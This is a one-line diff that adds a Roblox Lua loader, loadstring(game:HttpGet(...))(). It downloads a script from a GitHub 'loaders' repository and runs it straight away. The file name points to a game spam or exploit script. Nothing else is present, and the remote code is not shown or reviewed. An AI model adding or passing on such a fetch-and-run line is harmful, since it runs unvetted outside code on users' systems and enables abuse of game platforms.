@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/scrooms-spam0-1faxq5qpfibj2v.lua"))()
